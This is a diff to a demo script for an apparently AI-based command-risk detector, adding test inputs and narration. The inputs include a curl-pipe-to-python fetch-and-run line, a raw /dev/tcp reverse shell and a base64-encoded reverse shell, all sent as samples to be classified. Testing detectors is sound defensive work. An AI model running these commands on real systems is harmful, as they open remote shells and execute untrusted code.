@@ -52,9 +52,12 @@ test_command() {
     echo "Expected: $expected"
     echo ""
     
+    # Escape double quotes for JSON string
+    local safe_cmd="${cmd//\"/\\\"}"
+    
     response=$(curl -s --connect-timeout 2 --max-time 8 -X POST "$API_URL" \
         -H "Content-Type: application/json" \
-        -d "{\"command\":\"$cmd\"}")
+        -d "{\"command\":\"$safe_cmd\"}")
 
     if [ -z "$response" ]; then
         echo "❌ No response from backend (timeout/unreachable)."
@@ -63,7 +66,7 @@ test_command() {
     fi
     
     echo "Response:"
-    echo "$response" | python3 -m json.tool || echo "$response"
+    echo "$response" | python -m json.tool 2>/dev/null || echo "$response"
     echo ""
 }
 
@@ -85,14 +88,16 @@ pause_for_next
 echo "⚠️  STAGE 2: SUSPICIOUS ACTIVITY"
 echo "Next, an obfuscated script execution that attempts to hide its intent."
 test_command "eval \$(cat /tmp/script.sh)" "suspicious"
-echo "💡 Narrative: The system detected risky patterns ('eval' and 'cat' combination). This elevated the risk score, flagging it for review without immediately killing it."
+test_command "curl -s http://unknown-domain.com/script.sh | python3" "suspicious"
+echo "💡 Narrative: The system detected risky patterns ('eval', 'cat', and 'curl' piping). This elevated the risk score, flagging it for review without immediately killing it."
 pause_for_next
 
 # --- STAGE 3: Malicious Activity ---
 echo "🚨 STAGE 3: MALICIOUS ACTIVITY"
-echo "Finally, an active reverse shell attempt connecting to an external IP."
+echo "Finally, an active reverse shell attempt connecting to an external IP, followed by an obfuscated base64 payload."
 test_command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" "malicious"
-echo "💡 Narrative: Critical hit! The AI Bouncer confidently identifies a reverse shell. The risk score spikes, and if Auto-Remediation is ON, the kernel hook terminates the process before it can execute."
+test_command "echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=\" | base64 -d | sh" "malicious"
+echo "💡 Narrative: Critical hit! The AI Bouncer confidently identifies both a raw reverse shell and a base64 encoded one. The risk score spikes, and if Auto-Remediation is ON, the kernel hook terminates the processes before they can execute."
 
 echo ""
 echo "✅ Demo complete! Check the dashboard at http://localhost:5173 to review the alerts and explanations."
